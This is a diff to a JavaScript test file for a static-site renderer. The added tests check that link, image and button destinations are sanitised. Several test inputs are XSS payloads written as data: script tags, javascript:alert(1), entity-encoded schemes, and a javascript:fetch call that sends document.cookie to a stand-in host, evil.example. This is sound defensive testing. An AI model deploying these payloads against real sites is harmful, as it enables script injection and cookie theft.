@@ -4,7 +4,8 @@
 import assert from 'node:assert/strict';
 import {
   parseSite, serializeSite, isSiteFile, renderSiteToHtml, parseParams, FRONTMATTER_KEY,
-  ctaButtonsHtml, linkButtonsHtml, bodyHtml,
+  ctaButtonsHtml, linkButtonsHtml, bodyHtml, inlineHtml, ctaHtml, takeDropWarnings,
+  safeHref, safeSrc,
 } from './site-core.js';
 
 let passed = 0;
@@ -142,7 +143,9 @@ test('render: each of the 5 types emits its st- section', () => {
 
 test('render: hero bg → background-image, cta param → anchor', () => {
   const html = renderSiteToHtml(parseSite(CANON));
-  assert.ok(html.includes('background-image:url(cover.jpg)'), 'hero bg');
+  // round 5 (R4-P3-6): bg= now emits a QUOTED, CSS-string-escaped url() — see cssUrlString's own
+  // comment for why an unquoted url() token was a CSS-declaration-injection sink.
+  assert.ok(html.includes('background-image:url(&quot;cover.jpg&quot;)'), 'hero bg');
   assert.ok(html.includes('<a class="st-hero-cta" href="/signup">Get started</a>'), 'hero cta anchor');
   assert.ok(html.includes('<a class="st-cta-btn st-cta-btn-primary" href="/signup">Sign up<span class="st-cta-arrow" aria-hidden="true"><span class="signet-arrow"'), 'cta button anchor carries the interactive signet-arrow (internal → right), not a static ↗ glyph');
 });
@@ -634,6 +637,271 @@ test('links: a URL with a matched pair of underscores stays a link (emphasis mus
   assert.ok(!html.includes(']\(http'), 'no literal markdown link syntax left on the page');
 });
 
+test('link destination containing angle brackets is escaped before it is restored', () => {
+  // A destination-shaped `](…)` fragment used to be restored RAW into the page, whether or
+  // not it actually sat inside a real link — letting two unrelated fragments splice a live tag
+  // into otherwise ordinary prose.
+  const input = 'Hi ](<script>alert`1`;//) x ](</script>) bye';
+  const html = inlineHtml(input);
+  assert.ok(!html.includes('<script'), 'no live <script> element in the output');
+  assert.ok(html.includes('&lt;script&gt;'), 'the angle brackets are entity-escaped');
+});
+
+test('a normal link destination keeps its ampersand escaped and is otherwise unchanged', () => {
+  const html = inlineHtml('[a](https://x/y?z=1&w=2)');
+  assert.ok(html.includes('href="https://x/y?z=1&amp;w=2"'), 'the & in the query string is escaped in the href');
+  assert.equal(html, '<a href="https://x/y?z=1&amp;w=2" target="_blank" rel="noopener">a</a>');
+});
+
+test('a link destination with a disallowed scheme renders as text, not a live href', () => {
+  const html = inlineHtml('[a](javascript:alert(1))');
+  assert.ok(!html.includes('href='), 'no href attribute at all');
+  assert.ok(!html.includes('<a '), 'no anchor tag at all');
+});
+
+test('an image destination with a disallowed scheme renders no <img>', () => {
+  const html = inlineHtml('![alt text](javascript:alert(1))');
+  assert.ok(!html.includes('<img'), 'no <img> tag');
+  assert.ok(!html.includes('src='), 'no src attribute at all');
+});
+
+test('a normal image destination is unaffected by the scheme check', () => {
+  const html = inlineHtml('![alt](/images/x.png)');
+  assert.equal(html, '<img class="st-img" src="/images/x.png" alt="alt" loading="lazy" decoding="async">');
+});
+
+// ── round 2: widened allowlist (P1-2) ─────────────────────────────────────────────────────────
+
+test('tel:/sms:/ftp: destinations are live links, not silently dropped', () => {
+  assert.equal(inlineHtml('[Call](tel:+1234567890)'), '<a href="tel:+1234567890">Call</a>');
+  assert.equal(inlineHtml('[SMS](sms:+1)'), '<a href="sms:+1">SMS</a>');
+  assert.equal(inlineHtml('[F](ftp://x.example/f)'), '<a href="ftp://x.example/f">F</a>');
+});
+
+test('a raster data: image src is allowed; data:image/svg+xml is not', () => {
+  const html = inlineHtml('![i](data:image/png;base64,iVBORw0KGgo=)');
+  assert.equal(html, '<img class="st-img" src="data:image/png;base64,iVBORw0KGgo=" alt="i" loading="lazy" decoding="async">');
+  const svg = inlineHtml('![i](data:image/svg+xml;base64,PHN2Zz4=)');
+  assert.ok(!svg.includes('<img'), 'svg+xml never becomes a live <img>');
+  assert.equal(svg, 'i');
+});
+
+test('data: is never allowed on a plain href, even an image MIME', () => {
+  const html = inlineHtml('[a](data:image/png;base64,iVBORw0KGgo=)');
+  assert.ok(!html.includes('<a '), 'data: on an anchor stays plain text');
+  assert.equal(html, 'a');
+});
+
+test('a disallowed destination records one build-time drop warning naming the page and scheme', () => {
+  takeDropWarnings(); // drain anything left by an earlier test
+  const src = '---\nsitetile-page: contact\ntitle: T\n---\n\n## H\n%% sitetile: prose %%\n[a](javascript:alert(1)\n';
+  renderSiteToHtml(parseSite(src));
+  const warnings = takeDropWarnings();
+  assert.equal(warnings.length, 1, 'exactly one warning for the one disallowed destination');
+  assert.equal(warnings[0].page, 'contact');
+  assert.equal(warnings[0].scheme, 'javascript:');
+  assert.deepEqual(takeDropWarnings(), [], 'the queue is drained after being read');
+});
+
+test('a newly-allowed scheme (tel:) records no drop warning', () => {
+  takeDropWarnings();
+  const src = '---\nsitetile-page: t\n---\n\n## H\n%% sitetile: prose %%\n[Call](tel:+1)\n';
+  renderSiteToHtml(parseSite(src));
+  assert.deepEqual(takeDropWarnings(), []);
+});
+
+// ── round 2: decode-once-escape-once (P2-1) ──────────────────────────────────────────────────
+
+test('a destination already carrying an entity-escaped ampersand is not double-escaped', () => {
+  const html = inlineHtml('[a](https://x/y?z=1&amp;w=2)');
+  assert.equal(html, '<a href="https://x/y?z=1&amp;w=2" target="_blank" rel="noopener">a</a>');
+});
+
+test('a destination with a literal ampersand still gets single-escaped (unchanged behavior)', () => {
+  const html = inlineHtml('[a](https://x/y?z=1&w=2)');
+  assert.equal(html, '<a href="https://x/y?z=1&amp;w=2" target="_blank" rel="noopener">a</a>');
+});
+
+test('an entity-encoded javascript: scheme is rejected by the scheme check itself', () => {
+  assert.equal(inlineHtml('[a](javascript&#58;alert1)'), 'a');
+  assert.equal(inlineHtml('[a](javascript&#x3a;alert1)'), 'a');
+});
+
+// ── round 2: wikilink embeds are scheme-checked too (P2-2) ───────────────────────────────────
+
+test('a ![[wikilink]] embed with a disallowed scheme renders no live element', () => {
+  const html = inlineHtml('![[javascript:alert(1)]]');
+  assert.ok(!html.includes('<img'), 'no <img>');
+  assert.ok(!html.includes('src='), 'no src attribute at all');
+});
+
+test('a ![[wikilink]] embed with a safe destination is unaffected', () => {
+  const html = inlineHtml('![[photos/cover.jpg]]');
+  assert.equal(html, '<img class="st-img" src="photos/cover.jpg" alt="cover.jpg" loading="lazy" decoding="async">');
+});
+
+// ── round 2: every href/src emitter routes through the shared policy (P1-1) ─────────────────
+
+test('ctaHtml: a disallowed cta= href degrades to a plain span, never a live link', () => {
+  const html = ctaHtml({ label: 'Go', href: 'javascript:alert(1)' }, 'st-hero-cta');
+  assert.equal(html, '<span class="st-hero-cta">Go</span>');
+});
+
+test('ctaButtonsHtml: a disallowed body-link button degrades to a plain span', () => {
+  // A destination containing `)` truncates RE_CTA_LINK's match (pre-existing, unrelated to this
+  // fix — see the round-1 review's P3-4) and this paragraph would then fail `onlyLinks` and be
+  // read as caption prose instead of a button at all; the backtick-call form avoids that so THIS
+  // test exercises the button path.
+  const { row } = ctaButtonsHtml(null, '[Donate](javascript:alert`1`)');
+  assert.ok(!row.includes('href='), 'no href attribute at all');
+  assert.ok(row.includes('<span class="st-cta-btn st-cta-btn-primary">Donate</span>'), 'label survives as plain text');
+});
+
+test('linkButtonsHtml: a disallowed hero/social button degrades to a plain span', () => {
+  const html = linkButtonsHtml([{ label: 'Go', href: 'javascript:alert(1)', primary: true }], 'st-hero');
+  assert.ok(!html.includes('href='));
+  assert.ok(html.includes('<span class="st-hero-btn st-hero-btn-primary">Go</span>'));
+});
+
+test('render: the P1-1 probe payload (CTA body link + hero cta= param) never reaches a live href', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Support us', '%% sitetile: cta %%',
+    '[Donate](javascript:fetch`//evil.example/`+document.cookie)', '',
+    '## Hero', '%% sitetile: hero cta="Go"→javascript:alert`1` %%',
+    'Lead text.', '',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'), 'no javascript: scheme survives anywhere in the page');
+  assert.ok(!/<a\b/.test(html), 'no anchor at all — both destinations degrade to plain text');
+  assert.ok(html.includes('Donate') && html.includes('Go'), 'labels stay visible');
+});
+
+test('render: a grid cell with a disallowed href stays a plain (non-link) cell', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Picks', '%% sitetile: grid cols=2 %%',
+    '### Bad →javascript:alert(1)', 'text.',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'));
+  assert.ok(html.includes('<div class="st-cell"><h3>Bad</h3>'), 'falls back to the plain-cell shape');
+});
+
+test('render: a hero standalone image with a disallowed src is dropped, not emitted live', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Hero', '%% sitetile: hero layout=split %%',
+    'Lead text.', '',
+    '![a](javascript:fetch`//evil.example/`)', '',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'));
+  assert.ok(!html.includes('<img'));
+});
+
+// ── round 3: R2-P1-1 — collection `it.href` must gate on ITSELF, not on `it.learn` ───────────
+
+test('collection: a bad it.href does not go live just because it.learn is safe (R2-P1-1)', () => {
+  takeDropWarnings();
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Things', '%% sitetile: collection %%', '',
+    '### G', '',
+    '#### Item →javascript:alert(1)', '',
+    'learn: /safe', '', 'body text',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'), 'the bad it.href never reaches the page');
+  assert.ok(!/<a\b[^>]*st-item-gh/.test(html), 'the GitHub slot is not a live anchor');
+  assert.ok(html.includes('<span class="st-item-gh">'), 'it degrades to the plain (span) shape');
+  assert.ok(html.includes('<a class="st-item-learn" href="/safe"'), 'the OTHER, safe field is unaffected');
+  const warnings = takeDropWarnings();
+  assert.ok(warnings.some((w) => w.scheme === 'javascript:'), 'the drop is recorded in the diagnostics queue');
+});
+
+test('collection: it.href alone (no learn page) still needs isSafeHref to go live', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Things', '%% sitetile: collection %%', '',
+    '### G', '',
+    '#### Item →javascript:alert(1)', '',
+    'body text',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(!html.includes('javascript:'));
+});
+
+test('collection: a safe it.href with a safe it.learn still renders both live (no regression)', () => {
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## Things', '%% sitetile: collection %%', '',
+    '### G', '',
+    '#### Item →https://github.com/x/y', '',
+    'learn: /learn-more', '', 'body text',
+  ].join('\n') + '\n';
+  const html = renderSiteToHtml(parseSite(src));
+  assert.ok(/<a class="st-item-gh" href="https:\/\/github\.com\/x\/y"/.test(html), 'GH anchor is live');
+  assert.ok(html.includes('<a class="st-item-learn" href="/learn-more"'), 'learn anchor is live');
+});
+
+// ── round 3: R2-P2-1 — decodeEntitiesOnce must never throw ────────────────────────────────────
+
+test('decodeEntitiesOnce: an out-of-range numeric entity renders the page and escapes the text, never throws', () => {
+  assert.doesNotThrow(() => inlineHtml('see [a](&#x110000;) here'));
+  const html = inlineHtml('see [a](&#x110000;) here');
+  assert.ok(!html.includes('javascript:'));
+  // the entity could not be decoded to a real code point, so it is left as literal text and
+  // entity-escaped like any other author-typed `&` — never a thrown RangeError, never a live href
+  // built from an undecodable scheme.
+  assert.ok(html.includes('&amp;#x110000;'), 'the undecodable entity is preserved as escaped literal text');
+
+  const src = [
+    '---', 'sitetile-page: t', '---', '',
+    '## H', '%% sitetile: prose %%',
+    '[a](&#x110000;) and [b](&#1114112;) and [c](&#99999999999999999999;) and [d](&#xFFFFFF here',
+  ].join('\n') + '\n';
+  assert.doesNotThrow(() => renderSiteToHtml(parseSite(src)), 'a whole page with malformed numeric entities still renders');
+});
+
+test('decodeEntitiesOnce: a lone-surrogate numeric entity is left as-is, not turned into an unpaired surrogate', () => {
+  assert.doesNotThrow(() => inlineHtml('[a](&#xD800;javascript:alert(1))'));
+});
+
+// round 4: R3-P3-6 — a C0 control other than tab/LF/CR must not reach the output byte stream as a
+// literal control character (a downstream minifier or proxy that STRIPS rather than replaces a
+// NUL can turn `java\0script:` back into a live scheme). `&#0;` now decodes to nothing — it is
+// rejected by safeCodePoint and left as escaped literal text, the same degradation an undecodable
+// entity already gets — never a raw U+0000 in the emitted HTML.
+test('decodeEntitiesOnce: a NUL numeric entity is rejected, never emitted as a literal control byte', () => {
+  const html = inlineHtml('[a](&#0;x)');
+  assert.ok(!html.includes('\u0000'), 'no literal NUL in the output: ' + JSON.stringify(html));
+  const html2 = inlineHtml('[a](java&#0;script:alert(1))');
+  assert.ok(!html2.includes('\u0000'), 'no literal NUL in the output: ' + JSON.stringify(html2));
+});
+
+test('safeHref / safeSrc: the Astro-facing helpers return the string or null, matching isSafeHref/isSafeImageSrc', () => {
+  assert.equal(safeHref('/about'), '/about');
+  assert.equal(safeHref('javascript:alert(1)'), null);
+  assert.equal(safeHref(''), null);
+  assert.equal(safeHref(null), null);
+  assert.equal(safeSrc('data:image/png;base64,iVBORw0KGgo='), 'data:image/png;base64,iVBORw0KGgo=');
+  assert.equal(safeSrc('data:image/svg+xml;base64,PHN2Zz4='), null);
+  assert.doesNotThrow(() => safeHref('&#x110000;'));
+});
+
+// ── round 3: classification consistency — backslash/protocol-relative destinations ────────────
+
+test('linkKind: `\\\\evil`, `/\\evil` and `//evil` all classify the same way (external, cross-origin)', () => {
+  // A browser treats `\` exactly like `/` when resolving a URL, so these three are one
+  // destination spelled three ways and must not disagree about whether the link leaves the site.
+  const variants = ['\\\\evil.example', '/\\evil.example', '//evil.example'];
+  const results = variants.map((href) => linkButtonsHtml([{ label: 'Go', href, primary: true }], 'st-hero'));
+  for (const html of results) {
+    assert.ok(html.includes('target="_blank" rel="noopener"'), 'classified external → opens in a new tab: ' + html);
+    assert.ok(html.includes('signet-arrow--up-right'), 'classified external → up-right arrow: ' + html);
+  }
+});
 
 // ── people coral ───────────────────────────────────────────────────────────────────────────────
 // Grown for a client whose ONE roster shape was hand-rolled on five different pages (collaborating
@@ -1514,6 +1782,47 @@ test('\ud83d\udd34 #496 round 7 \u2014 R6-P2-01: the 4-column carve-out is space
 
 test('\ud83d\udd34 #496 round 6 \u2014 R5-P2-02: an ordinary CJK-indented paragraph with no comment at all is unaffected', () => {
   assert.equal(bodyHtml('\u3000\u3000plain text'), '<p>plain text</p>');
+});
+
+// \u2500\u2500 #496 (comment scan) \u00d7 #link-dest (destination escaping): the two interaction cases \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+// inlineHtml() stashes every `](\u2026)` destination to a N placeholder BEFORE escapeInline()'s
+// comment scan ever runs (see inlineHtml's own module comment) \u2014 so the two features never see the
+// SAME characters at the SAME time. Composed per CommonMark (a raw HTML comment is not itself part of
+// the link-destination grammar, and a destination's own text is never re-parsed for HTML constructs):
+// a comment-shaped run of characters that ends up INSIDE a destination is just destination text (never
+// recognized as a comment, since escapeInline never sees it \u2014 it is hidden behind the placeholder);
+// a destination-shaped `](\u2026)` run that ends up entirely INSIDE a real HTML comment is deleted along
+// with the rest of that comment (the placeholder is plain text to the comment scan, gone like any
+// other character between `<!--` and `-->`) and never reaches the scheme check at all.
+test('#496 x link-dest: an HTML-comment-shaped run INSIDE a destination is destination text, not a comment \u2014 never stripped, never a live scheme', () => {
+  // No parens in the payload: the destination regex `[^)\s]+` stops at the first `)`, which is not
+  // this test's concern (a pre-existing, unrelated limitation with a literal `)` inside a URL).
+  const link = inlineHtml('[a](<!--evil-->javascript:x)');
+  // Not stripped: escapeInline's comment scan runs BEFORE stashing restores the placeholder to text \u2014
+  // by the time this text is visible again, comment-scanning is long over. The markers survive, escaped.
+  assert.equal(link, '<a href="&lt;!--evil--&gt;javascript:x">a</a>');
+  // Not a live javascript: scheme either: the string does not START with a valid scheme (`<` is not a
+  // legal scheme character), so isSafeHref resolves it as a path relative to the safe base \u2014 the
+  // literal text "javascript:x" sits inertly inside an http: URL's path, never executed by a browser.
+  assert.ok(link.includes('href="'), 'still a real anchor \u2014 the leading comment text does not disallow the whole destination');
+  assert.doesNotMatch(link, /href="javascript:/, 'the comment prefix must not be stripped INTO a bare javascript: scheme');
+
+  const img = inlineHtml('![a](<!--evil-->javascript:x)');
+  assert.equal(img, '<img class="st-img" src="&lt;!--evil--&gt;javascript:x" alt="a" loading="lazy" decoding="async">');
+});
+
+test('#496 x link-dest: a destination sitting entirely INSIDE an HTML comment is removed with the comment \u2014 no link forms, no drop warning fires', () => {
+  takeDropWarnings(); // drain anything left by an earlier test
+  const html = inlineHtml('see <!-- [x](javascript:alert(1)) --> done');
+  assert.equal(html, 'see  done');
+  assert.doesNotMatch(html, /javascript|alert|<a |href=/, 'the fake link never surfaces as text, an href, or anything else');
+  // isSafeHref/isSafeImageSrc (the only place a drop is recorded) never ran on this destination \u2014 the
+  // comment scan deleted the placeholder token along with the rest of the comment before the
+  // stash-restore step ever reintroduced it into the text stream for the link regex to find.
+  assert.equal(takeDropWarnings().length, 0, 'a destination erased by comment-removal is not a "disallowed" destination \u2014 it never reached the check');
+
+  const block = bodyHtml('before <!-- [x](javascript:alert(1)) --> after');
+  assert.equal(block, '<p>before  after</p>');
 });
 
 console.log('\nsitetile: ' + passed + ' passed' + (process.exitCode ? ', SOME FAILED' : ', all green'));
